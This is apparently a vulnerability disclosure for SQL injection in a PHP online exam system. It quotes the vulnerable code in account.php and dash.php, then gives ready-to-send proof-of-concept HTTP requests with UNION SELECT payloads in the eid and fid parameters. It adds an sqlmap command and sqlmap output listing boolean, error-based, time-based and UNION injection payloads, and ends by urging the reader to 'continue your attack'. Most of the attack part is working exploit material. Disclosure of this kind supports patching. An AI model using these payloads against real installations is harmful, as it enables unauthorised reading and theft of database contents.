# online-exam-mastering-system has  SQL injection vulnerability 

## supplier

https://code-projects.org/online-exam-mastering-system-php/

## Vulnerability file

account.php、dash.php

## describe

in account.php

~~~php+HTML
if(@$_GET['q']== 'result' && @$_GET['eid']) 
{
$eid=@$_GET['eid'];
$q=mysqli_query($con,"SELECT * FROM history WHERE eid='$eid' AND email='$email' " )or die('Error157');
echo  '<div class="panel">
<center><h1 class="title" style="color:#660033">Result</h1><center><br /><table class="table table-striped title1" style="font-size:20px;font-weight:1000;">';

~~~

We can control the parameters of q and EID, and there are no protective measures in the following SQL statements, so directly splicing SQL statements can cause SQL injection

# POC

~~~
GET http://127.0.0.1/account.php?q=result&eid=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,database(),NULL,NULL%23 HTTP/1.1
Host: 127.0.0.1
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=58cv9hn8ommu0em8roqc9alt9h
Connection: keep-alive


~~~



---

in dash.php

~~~php
<?php if(@$_GET['fid']) {
echo '<br />';
$id=@$_GET['fid'];
$result = mysqli_query($con,"SELECT * FROM feedback WHERE id='$id' ") or die('Error');
while($row = mysqli_fetch_array($result)) {
	$name = $row['name'];
	$subject = $row['subject'];
	$date = $row['date'];
	$date= date("d-m-Y",strtotime($date));
	$time = $row['time'];
	$feedback = $row['feedback'];
	
echo '<div class="panel"<a title="Back to Archive" href="update.php?q1=2"><b><span class="glyphicon glyphicon-level-up" aria-hidden="true"></span></b></a><h2 style="text-align:center; margin-top:-15px;font-family: "Ubuntu", sans-serif;"><b>'.$subject.'</b></h1>';
 echo '<div class="mCustomScrollbar" data-mcs-theme="dark" style="margin-left:10px;margin-right:10px; max-height:450px; line-height:35px;padding:5px;"><span style="line-height:35px;padding:5px;">-&nbsp;<b>DATE:</b>&nbsp;'.$date.'</span>
<span style="line-height:35px;padding:5px;">&nbsp;<b>Time:</b>&nbsp;'.$time.'</span><span style="line-height:35px;padding:5px;">&nbsp;<b>By:</b>&nbsp;'.$name.'</span><br />'.$feedback.'</div></div>';}
}?>
~~~

We can control the FID parameters artificially, and there are no protective measures in the following SQL statements, so directly splicing SQL statements can cause SQL injection

# POC

~~~
GET http://127.0.0.1/dash.php?q=3&fid=5589858b6c43b%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,database(),NULL,NULL--%20- HTTP/1.1
Host: 127.0.0.1
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=58cv9hn8ommu0em8roqc9alt9h
Connection: keep-alive

~~~

You can see that there is a database name in the return package, which causes SQL injection

# Exploit

~~~
sqlmap -r 1 --dbs
~~~

~~~
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: q=result&eid=1' OR NOT 5331=5331#
    Vector: OR NOT [INFERENCE]#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: q=result&eid=1' AND GTID_SUBSET(CONCAT(0x7171707071,(SELECT (ELT(5894=5894,1))),0x716b627871),5894)-- kXiK
    Vector: AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: q=result&eid=1' AND (SELECT 1313 FROM (SELECT(SLEEP(5)))qaUX)-- IUKU
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 7 columns
    Payload: q=result&eid=1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171707071,0x614e76796d484f51794a647655646e43484876566e446e67764364464f4363704f585969526d707a,0x716b627871),NULL,NULL#
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL#
---

~~~

use sqlmap to continue your attack.
